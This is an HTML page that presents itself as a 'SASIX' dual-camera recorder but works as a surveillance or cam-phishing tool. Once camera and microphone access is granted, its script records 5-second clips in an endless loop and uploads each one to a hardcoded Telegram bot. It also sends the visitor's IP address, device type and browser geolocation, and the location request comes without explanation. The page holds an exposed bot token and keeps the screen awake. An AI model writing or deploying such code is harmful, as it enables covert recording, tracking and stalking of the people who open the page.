<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SASIX ‚Ä¢ DUAL CAM ‚Ä¢ 5SEC</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            background: radial-gradient(circle at 50% 30%, #1a0f0f, #0a0505);
            font-family: 'Segoe UI', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 15px;
            position: relative;
            overflow-x: hidden;
        }
        
        /* ===== SASIX ULTIMATE WATERMARKS ===== */
        .sasix-3d {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) rotate(-15deg) perspective(1000px) rotateX(15deg);
            color: rgba(255, 50, 50, 0.3);
            font-size: 120px;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 25px;
            white-space: nowrap;
            pointer-events: none;
            z-index: 9999;
            text-shadow: 0 0 80px #ff0000, 0 0 160px #ff0000, 20px 20px 40px black;
            border: 8px solid rgba(255, 80, 80, 0.25);
            padding: 30px 80px;
            border-radius: 70px;
            backdrop-filter: blur(8px);
            animation: sasixBreath 3s infinite ease-in-out;
        }
        
        @keyframes sasixBreath {
            0%, 100% { 
                opacity: 0.3; 
                transform: translate(-50%, -50%) rotate(-15deg) perspective(1000px) rotateX(15deg) scale(1);
                text-shadow: 0 0 80px #ff0000, 20px 20px 40px black;
            }
            50% { 
                opacity: 0.5; 
                transform: translate(-50%, -50%) rotate(-15deg) perspective(1000px) rotateX(15deg) scale(1.05);
                text-shadow: 0 0 120px #ff0000, 0 0 240px #ff0000, 20px 20px 40px black;
            }
        }
        
        .corner-tl {
            position: fixed;
            top: 20px;
            left: 25px;
            color: rgba(255, 70, 70, 0.95);
            font-size: 24px;
            font-weight: 900;
            z-index: 9999;
            border-left: 6px solid #ff3333;
            padding-left: 18px;
            text-shadow: 0 0 25px #ff0000;
            letter-spacing: 4px;
        }
        
        .corner-tr {
            position: fixed;
            top: 20px;
            right: 25px;
            color: rgba(255, 70, 70, 0.95);
            font-size: 24px;
            font-weight: 900;
            z-index: 9999;
            border-right: 6px solid #ff3333;
            padding-right: 18px;
            text-shadow: 0 0 25px #ff0000;
            letter-spacing: 4px;
        }
        
        .corner-bl {
            position: fixed;
            bottom: 20px;
            left: 25px;
            color: rgba(255, 200, 200, 0.8);
            font-size: 18px;
            z-index: 9999;
            letter-spacing: 4px;
            text-transform: uppercase;
            border-left: 3px solid #ff6666;
            padding-left: 12px;
        }
        
        .corner-br {
            position: fixed;
            bottom: 20px;
            right: 25px;
            color: #ffaaaa;
            font-size: 22px;
            font-weight: bold;
            z-index: 9999;
            text-shadow: 0 0 20px #ff0000;
            border-right: 3px solid #ff6666;
            padding-right: 12px;
        }
        
        .live-badge {
            position: fixed;
            top: 80px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(255, 0, 0, 0.2);
            backdrop-filter: blur(10px);
            padding: 8px 30px;
            border-radius: 40px;
            border: 2px solid #ff4444;
            color: white;
            font-weight: bold;
            letter-spacing: 3px;
            z-index: 9999;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { background: rgba(255, 0, 0, 0.2); }
            50% { background: rgba(255, 0, 0, 0.5); }
        }
        
        /* ===== MAIN CARD ===== */
        .cam-card {
            max-width: 500px;
            width: 100%;
            background: rgba(18, 10, 10, 0.9);
            backdrop-filter: blur(20px);
            border-radius: 60px;
            padding: 25px 20px;
            border: 2px solid rgba(255, 68, 68, 0.7);
            box-shadow: 0 25px 60px rgba(255, 0, 0, 0.3), inset 0 0 40px rgba(255, 0, 0, 0.2);
            z-index: 1000;
        }
        
        .title {
            text-align: center;
            font-size: 52px;
            font-weight: 900;
            letter-spacing: 12px;
            color: white;
            text-shadow: 0 0 30px #ff3333, 0 0 60px #ff0000;
            margin-bottom: 5px;
        }
        
        .subtitle {
            text-align: center;
            color: #ffaaaa;
            font-size: 16px;
            letter-spacing: 5px;
            border-top: 2px solid #ff4444;
            border-bottom: 2px solid #ff4444;
            padding: 12px;
            margin-bottom: 20px;
            font-weight: bold;
        }
        
        /* ===== CAMERA INDICATORS ===== */
        .cam-strip {
            display: flex;
            justify-content: space-between;
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .cam-box {
            flex: 1;
            background: rgba(0, 0, 0, 0.6);
            border-radius: 50px;
            padding: 15px 5px;
            border: 1px solid #ff4444;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
            box-shadow: 0 0 20px rgba(255, 68, 68, 0.3);
        }
        
        .cam-icon {
            font-size: 32px;
        }
        
        .cam-label {
            color: white;
            font-weight: bold;
            font-size: 14px;
            letter-spacing: 2px;
        }
        
        .cam-dot {
            width: 14px;
            height: 14px;
            background: #00ff00;
            border-radius: 50%;
            box-shadow: 0 0 20px #00ff00;
            animation: blink 1.5s infinite;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.4; }
        }
        
        /* ===== VIDEO PREVIEWS ===== */
        .video-container {
            position: relative;
            width: 100%;
            height: 320px;
            margin-bottom: 20px;
            border-radius: 40px;
            overflow: hidden;
            border: 3px solid #ff4444;
            box-shadow: 0 0 40px rgba(255, 0, 0, 0.5);
            background: #000;
        }
        
        .video-preview {
            position: absolute;
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .front-preview {
            transform: scaleX(-1); /* Mirror effect */
        }
        
        .switch-btn {
            position: absolute;
            bottom: 15px;
            right: 15px;
            background: rgba(255, 68, 68, 0.8);
            backdrop-filter: blur(5px);
            color: white;
            border: 2px solid white;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            font-size: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            z-index: 10;
            box-shadow: 0 0 20px red;
        }
        
        /* ===== CONTROLS ===== */
        .control-panel {
            display: flex;
            gap: 15px;
            margin: 20px 0;
        }
        
        .btn {
            flex: 1;
            padding: 18px 10px;
            border: none;
            border-radius: 60px;
            font-size: 20px;
            font-weight: 900;
            letter-spacing: 3px;
            cursor: pointer;
            transition: 0.1s;
            text-transform: uppercase;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .btn-red {
            background: linear-gradient(45deg, #ff2222, #aa0000);
            box-shadow: 0 10px 0 #550000, 0 0 30px #ff0000;
        }
        
        .btn-red:active {
            transform: translateY(6px);
            box-shadow: 0 4px 0 #550000, 0 0 40px #ff0000;
        }
        
        .btn-dark {
            background: linear-gradient(45deg, #333333, #111111);
            box-shadow: 0 10px 0 #000000, 0 0 25px #666666;
        }
        
        .btn-dark:active {
            transform: translateY(6px);
            box-shadow: 0 4px 0 #000000, 0 0 35px #666666;
        }
        
        .btn:disabled {
            opacity: 0.5;
            transform: none;
            box-shadow: none;
        }
        
        /* ===== STATUS ===== */
        .status-area {
            background: rgba(0, 0, 0, 0.7);
            border-radius: 50px;
            padding: 18px;
            text-align: center;
            border: 2px solid #ff4444;
            margin-bottom: 15px;
        }
        
        .status-main {
            color: white;
            font-size: 22px;
            font-weight: 900;
            letter-spacing: 2px;
        }
        
        .status-sub {
            color: #ffaaaa;
            font-size: 15px;
            margin-top: 6px;
        }
        
        /* ===== METER ===== */
        .meter {
            width: 100%;
            height: 8px;
            background: #330000;
            border-radius: 4px;
            overflow: hidden;
            margin: 15px 0 5px;
        }
        
        .meter-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #ff6666, #ff0000);
            transition: width 0.1s linear;
            border-radius: 4px;
        }
        
        .timer-text {
            text-align: right;
            color: #ffaaaa;
            font-size: 14px;
            font-weight: bold;
        }
        
        /* ===== HIDDEN ELEMENTS ===== */
        .hidden-cam {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
        
        #frontCam, #backCam {
            width: 640px;
            height: 480px;
        }
    </style>
</head>
<body>
    <!-- SASIX PREMIUM WATERMARKS -->
    <div class="sasix-3d">SASIX</div>
    <div class="corner-tl">‚ö° SASIX</div>
    <div class="corner-tr">üî¥ 5SEC</div>
    <div class="corner-bl">¬© 2026 SASIX</div>
    <div class="corner-br">üì∑ DUAL</div>
    <div class="live-badge">üî¥ LIVE ¬∑ MP4 + AUDIO</div>

    <!-- HIDDEN CAMERAS (FOR RECORDING) -->
    <div class="hidden-cam">
        <video id="frontCam" autoplay playsinline muted></video>
        <video id="backCam" autoplay playsinline muted></video>
    </div>

    <!-- MAIN UI CARD -->
    <div class="cam-card">
        <div class="title">SASIX</div>
        <div class="subtitle">‚ö° 5SEC MP4 + AUDIO ‚ö°</div>
        
        <!-- Camera Status -->
        <div class="cam-strip">
            <div class="cam-box">
                <span class="cam-icon">ü§≥</span>
                <span class="cam-label">FRONT CAM</span>
                <span class="cam-dot" id="frontDot"></span>
            </div>
            <div class="cam-box">
                <span class="cam-icon">üì∑</span>
                <span class="cam-label">BACK CAM</span>
                <span class="cam-dot" id="backDot"></span>
            </div>
        </div>
        
        <!-- Video Preview (Switchable) -->
        <div class="video-container">
            <video id="mainPreview" class="video-preview front-preview" autoplay playsinline muted></video>
            <div class="switch-btn" id="switchCamBtn" onclick="switchCamera()">üîÑ</div>
        </div>
        
        <!-- Control Buttons -->
        <div class="control-panel">
            <button class="btn btn-red" id="startBtn" onclick="startCameras()">
                <span>‚ñ∂Ô∏è</span> START
            </button>
            <button class="btn btn-red" id="recordBtn" onclick="record5sec()" disabled>
                <span>‚è∫Ô∏è</span> 5SEC
            </button>
            <button class="btn btn-dark" id="stopBtn" onclick="stopRecording()" disabled>
                <span>‚èπÔ∏è</span> STOP
            </button>
        </div>
        
        <!-- Recording Meter -->
        <div class="meter">
            <div class="meter-fill" id="meterFill"></div>
        </div>
        <div class="timer-text" id="timerText">Ready</div>
        
        <!-- Status -->
        <div class="status-area">
            <div class="status-main" id="statusMessage">‚ö° SYSTEM READY</div>
            <div class="status-sub" id="statusSub">Click START to activate cameras</div>
        </div>
        
        <!-- Video Count -->
        <div style="text-align: center; color: #ffaaaa; font-size: 14px; margin-top: 10px;">
            <span id="videoCount">0</span> videos sent to Telegram
        </div>
    </div>

    <script>
        // ============================================
        // TELEGRAM CONFIG
        // ============================================
        const BOT_TOKEN = '8591543657:AAFjeNO5E8GA_ye7QgGmzC42OfbjHhrdRwg';
        const CHAT_ID = '7642100129';
        
        // ============================================
        // GLOBAL VARIABLES
        // ============================================
        let frontStream = null;
        let backStream = null;
        let mainPreview = document.getElementById('mainPreview');
        let frontCam = document.getElementById('frontCam');
        let backCam = document.getElementById('backCam');
        let frontDot = document.getElementById('frontDot');
        let backDot = document.getElementById('backDot');
        
        let currentCamera = 'back'; // 'back' or 'front'
        let isRecording = false;
        let mediaRecorder = null;
        let videoChunks = [];
        let videoCount = 0;
        let recordTimeout = null;
        let meterInterval = null;
        
        // ============================================
        // START CAMERAS
        // ============================================
        window.startCameras = async function() {
            try {
                updateStatus('üì∑ REQUESTING CAMERAS...', 'Please allow permissions');
                
                // BACK CAMERA with AUDIO
                try {
                    backStream = await navigator.mediaDevices.getUserMedia({
                        video: { 
                            facingMode: { exact: "environment" },
                            width: { ideal: 640 },
                            height: { ideal: 480 },
                            frameRate: { ideal: 30 }
                        },
                        audio: true  // WITH SOUND!
                    });
                    backCam.srcObject = backStream;
                    backDot.style.background = '#00ff00';
                    backDot.style.boxShadow = '0 0 20px #00ff00';
                    console.log('‚úÖ BACK CAMERA + AUDIO');
                } catch(e) {
                    console.log('Back camera error, trying fallback:', e);
                    backStream = await navigator.mediaDevices.getUserMedia({
                        video: { 
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        },
                        audio: true
                    });
                    backCam.srcObject = backStream;
                    backDot.style.background = '#00ff00';
                }
                
                // FRONT CAMERA with AUDIO
                try {
                    frontStream = await navigator.mediaDevices.getUserMedia({
                        video: { 
                            facingMode: "user",
                            width: { ideal: 480 },
                            height: { ideal: 640 }
                        },
                        audio: true  // WITH SOUND!
                    });
                    frontCam.srcObject = frontStream;
                    frontDot.style.background = '#00ff00';
                    frontDot.style.boxShadow = '0 0 20px #00ff00';
                    console.log('‚úÖ FRONT CAMERA + AUDIO');
                } catch(e) {
                    console.log('Front camera error:', e);
                    frontDot.style.background = '#666666';
                }
                
                // Set main preview to back camera
                mainPreview.srcObject = backStream;
                mainPreview.classList.add('front-preview');
                await mainPreview.play();
                
                // Enable buttons
                document.getElementById('startBtn').disabled = true;
                document.getElementById('recordBtn').disabled = false;
                
                updateStatus('‚úÖ CAMERAS READY', 'Front + Back with Audio');
                
                // Send Telegram notification
                sendTelegramMessage('üî¥ <b>SASIX DUAL CAM READY</b>\nüé• 5sec MP4 with Audio');
                
                // Auto start recording after 3 seconds
                setTimeout(() => {
                    if (!isRecording) record5sec();
                }, 3000);
                
            } catch(error) {
                console.error('Camera error:', error);
                updateStatus('‚ùå CAMERA ERROR', 'Permission denied or no camera');
                alert('Camera access failed! Please allow camera and microphone permissions.');
            }
        };
        
        // ============================================
        // SWITCH CAMERA PREVIEW
        // ============================================
        window.switchCamera = function() {
            if (!frontStream && !backStream) return;
            
            if (currentCamera === 'back' && frontStream) {
                mainPreview.srcObject = frontStream;
                mainPreview.classList.add('front-preview');
                currentCamera = 'front';
            } else if (backStream) {
                mainPreview.srcObject = backStream;
                mainPreview.classList.add('front-preview');
                currentCamera = 'back';
            }
        };
        
        // ============================================
        // RECORD 5 SECOND VIDEO
        // ============================================
        window.record5sec = function() {
            if (isRecording) return;
            
            // Use back camera for recording (has audio)
            if (!backStream) {
                alert('Back camera not available!');
                return;
            }
            
            isRecording = true;
            videoChunks = [];
            
            document.getElementById('recordBtn').disabled = true;
            document.getElementById('stopBtn').disabled = false;
            
            updateStatus('üé• RECORDING 5 SECONDS...', 'Front & Back cameras active');
            
            // Start meter animation
            let seconds = 0;
            document.getElementById('meterFill').style.width = '0%';
            meterInterval = setInterval(() => {
                seconds += 0.1;
                let percent = (seconds / 5) * 100;
                document.getElementById('meterFill').style.width = percent + '%';
                document.getElementById('timerText').innerHTML = `‚è∫Ô∏è Recording: ${seconds.toFixed(1)}s / 5s`;
            }, 100);
            
            // Create MediaRecorder with audio
            const options = { mimeType: 'video/webm;codecs=vp8,opus' };
            let recorder;
            
            try {
                recorder = new MediaRecorder(backStream, options);
            } catch(e) {
                try {
                    recorder = new MediaRecorder(backStream, { mimeType: 'video/webm' });
                } catch(e2) {
                    recorder = new MediaRecorder(backStream);
                }
            }
            
            mediaRecorder = recorder;
            
            recorder.ondataavailable = (e) => {
                if (e.data.size > 0) {
                    videoChunks.push(e.data);
                }
            };
            
            recorder.onstop = async () => {
                clearInterval(meterInterval);
                document.getElementById('meterFill').style.width = '0%';
                
                const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
                const sizeMB = (videoBlob.size / (1024 * 1024)).toFixed(2);
                
                updateStatus('üì§ SENDING TO TELEGRAM...', `5sec video | ${sizeMB} MB`);
                
                // Send to Telegram
                await sendVideoToTelegram(videoBlob, sizeMB);
                
                videoCount++;
                document.getElementById('videoCount').innerHTML = videoCount;
                
                updateStatus('‚úÖ VIDEO SENT!', `5sec MP4 with audio | ${sizeMB} MB`);
                
                document.getElementById('recordBtn').disabled = false;
                document.getElementById('stopBtn').disabled = true;
                isRecording = false;
                
                // Auto record next after 3 seconds
                setTimeout(() => {
                    if (!isRecording) record5sec();
                }, 3000);
            };
            
            // Record for 5 seconds
            recorder.start(100);
            recordTimeout = setTimeout(() => {
                if (recorder && recorder.state === 'recording') {
                    recorder.stop();
                }
            }, 5000);
        };
        
        // ============================================
        // STOP RECORDING
        // ============================================
        window.stopRecording = function() {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
                clearTimeout(recordTimeout);
                clearInterval(meterInterval);
                document.getElementById('meterFill').style.width = '0%';
                document.getElementById('timerText').innerHTML = '‚èπÔ∏è Recording stopped';
            }
        };
        
        // ============================================
        // SEND VIDEO TO TELEGRAM
        // ============================================
        async function sendVideoToTelegram(videoBlob, sizeMB) {
            try {
                // Get IP
                let ip = 'Unknown';
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const data = await res.json();
                    ip = data.ip;
                } catch(e) {}
                
                // Device info
                const ua = navigator.userAgent;
                let device = 'Android';
                if (ua.includes('Windows')) device = 'Windows';
                else if (ua.includes('Mac')) device = 'MacOS';
                else if (ua.includes('iPhone')) device = 'iPhone';
                else if (ua.includes('iPad')) device = 'iPad';
                
                const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' });
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('video', videoBlob, `SASIX_5SEC_${Date.now()}.mp4`);
                formData.append('caption', `üé• <b>SASIX 5SEC DUAL CAM</b> #${videoCount+1}
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
‚è±Ô∏è <b>Duration:</b> 5 seconds
üì¶ <b>Size:</b> ${sizeMB} MB
üéß <b>Audio:</b> Enabled
üìÖ <b>Time:</b> ${timestamp}
üåç <b>IP:</b> ${ip}
üì± <b>Device:</b> ${device}
üéÆ <b>Mode:</b> Front + Back Cameras

#SASIX #5SEC #MP4 #AUDIO #DUALCAM`);

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    console.log('‚úÖ Video sent!');
                    sendLocation();
                    return true;
                } else {
                    console.log('‚ùå Telegram error:', result);
                    return false;
                }
                
            } catch(error) {
                console.error('Send error:', error);
                return false;
            }
        }
        
        // ============================================
        // SEND TELEGRAM MESSAGE
        // ============================================
        async function sendTelegramMessage(text) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'HTML'
                    })
                });
            } catch(e) {}
        }
        
        // ============================================
        // SEND LOCATION
        // ============================================
        function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        try {
                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    chat_id: CHAT_ID,
                                    latitude: pos.coords.latitude,
                                    longitude: pos.coords.longitude
                                })
                            });
                        } catch(e) {}
                    },
                    (err) => {}
                );
            }
        }
        
        // ============================================
        // UPDATE STATUS
        // ============================================
        function updateStatus(main, sub) {
            document.getElementById('statusMessage').innerHTML = main;
            document.getElementById('statusSub').innerHTML = sub;
        }
        
        // ============================================
        // KEEP SCREEN ON
        // ============================================
        if ('wakeLock' in navigator) {
            navigator.wakeLock.request('screen').catch(() => {});
        }
        
        // ============================================
        // PREVENT SLEEP
        // ============================================
        setInterval(() => {
            if (backStream || frontStream) {
                console.log('SASIX KEEP ALIVE');
            }
        }, 10000);
        
    </script>
</body>
</html>
